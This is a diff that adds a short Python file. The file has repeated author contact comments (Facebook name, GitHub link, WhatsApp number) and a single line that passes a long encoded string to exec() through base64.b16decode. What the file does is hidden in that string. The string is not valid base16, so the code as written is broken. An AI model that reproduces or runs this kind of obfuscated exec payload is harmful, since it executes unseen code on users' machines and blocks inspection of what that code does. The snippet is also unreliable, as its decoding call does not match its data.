@@ -1,0 +1,8 @@
+#Facebook : William Jack
+#Github   : https://github.com/Williamjack69
+#Whatsapp : +923100209977
+#Facebook : William Jack
+#Github   : https://github.com/Williamjack69
+#Whatsapp : +923100209977
+import base64
+exec(base64.b16decode('DfX34ZvRGOMhA0NFDyerBZtgMkIdB3nKnlVrlvBnE+nrsuHL2Obm41G8KrbyVDUQ5SCZAS6WG6KxvOJy9PJ9PTa5BOjtRcGQgcyuKVs+t3NIL9Sb8UNweBXJowm8dN6sQlFt1uG+JJ7rQsb46XcMEwyrjMQUjHJUSuHMQWYf5utMlNfWEzMpgnb/CBefG6OScex1V1GRC2+fJrbPMPePfSvkSjMvhbBgwQqzlWNqzM4RVla85gKh2ADo9xN0vIgFtM856OhLVd4LpHLUYvR5TBXXBp8c8HLNwApbtmqULnqTdq6gKG3K42y5nf+9yT0yJaMlj8lFEXb+5Au752f2KukaCDy1clS2N1ugkc+cTmon5SUr5qLSjOJfhfk0ksPyf+9On6DwWi6cdcpmjH5Dl5U40wW2HliN9Rq+sqOJmGKDO9izpIwfjY/5RGbYRrmtBQRkRAoudmIMx2hQbswZD39gpKcYOI3cBqdXKhERaR2bDGccZ7DcVLY6ZcHJeu7bz0YBdkbxt6VO5BewWlD9uONQZzZtuBOeJRkUX0ZEuk/t3bSLnqqUYTpPXR5tq8u+m/WnTIGQg14RsJ4ALxTjbLGa0/g/J5NdZzzruXW0jOng2VqP44tU6IkheRYfSiE/'))
